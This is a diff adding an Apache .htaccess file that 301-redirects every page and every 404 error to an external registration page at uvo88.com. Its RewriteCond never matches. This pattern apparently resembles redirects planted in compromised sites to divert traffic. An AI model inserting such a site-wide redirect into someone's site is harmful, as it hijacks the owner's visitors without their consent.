@@ -1,0 +1,7 @@
+# Redirect all pages to https://uvo88.com/register
+RewriteEngine On
+RewriteCond %{REQUEST_URI} !^/https://uvo88.com/register [NC]
+RewriteRule ^ https://uvo88.com/register [R=301,L]
+
+# Redirect 404 errors to https://uvo88.com/register
+ErrorDocument 404 https://uvo88.com/register
